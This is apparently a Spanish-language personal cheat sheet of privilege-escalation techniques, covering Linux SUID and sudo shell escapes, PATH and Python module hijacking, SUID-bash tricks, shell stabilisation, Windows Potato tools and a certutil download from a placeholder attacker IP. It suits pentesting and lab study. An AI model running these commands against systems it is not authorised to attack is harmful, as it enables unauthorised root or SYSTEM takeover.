---
tags:
  - Chuletas
---
# Escalada de privilegios

## Enumeración inicial
- `sudo -l` (qué puedo ejecutar como otro usuario)
- `find / -perm -4000 -type f 2>/dev/null` (binarios SUID)
- `find / -perm -u=s 2>/dev/null`
- `crontab -l` y `cat /etc/crontab` (tareas programadas)
- `linpeas.sh` / `winPEAS` · `pspy64` (procesos y cron sin privilegios)

## Vías habituales (Linux)
- **GTFOBins**: binario permitido por `sudo`/SUID → consultar en [gtfobins.github.io](https://gtfobins.github.io/)
  - `find`: `sudo find . -exec /bin/sh \; -quit`
  - `php`: `sudo -u <user> php -r 'system("/bin/sh -i");'`
  - `sed`, `bpftrace --unsafe`, `logrotate`, etc.
- **Secuestro de $PATH**: script que llama a un binario sin ruta absoluta →
  crear binario falso en `/tmp`, `export PATH=/tmp:$PATH`
- **Secuestro de módulo Python**: script como otro usuario que importa un módulo →
  crear `modulo.py` con `import os; os.system("/bin/bash")` en el `$PATH` del script
- **Script editable + sudo**: `echo 'chmod u+s /bin/bash' >> script.sh` → `/bin/bash -p`
- **Cron como root** con fichero de entrada controlable (p. ej. Curling: `curl -K input`)
- **chattr / lsattr**: quitar inmutabilidad (`chattr -i`) antes de sobrescribir un script privilegiado
- **SUID bash**: `echo "chmod +s /bin/bash" >> <script-privilegiado>` → `/bin/bash -p`

## Estabilizar la shell
```
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

## Potato (Windows — abuso de SeImpersonatePrivilege)
Cuando `whoami /priv` muestra `SeImpersonatePrivilege`:

| Sistema | Herramienta |
|---|---|
| Win7 / Server 2008–2016 | JuicyPotato |
| Server 2019 | JuicyPotatoNG |
| Server 2019 (endurecido) | RoguePotato |
| Win10 2004+ | GodPotato |
| Win10 / Server 2019 | SweetPotato / PrintSpoofer |

Subir con `certutil -urlcache -split -f http://<ip>/tool.exe tool.exe`.

**LOLBAS** para living-off-the-land en Windows: [lolbas-project.github.io](https://lolbas-project.github.io/).
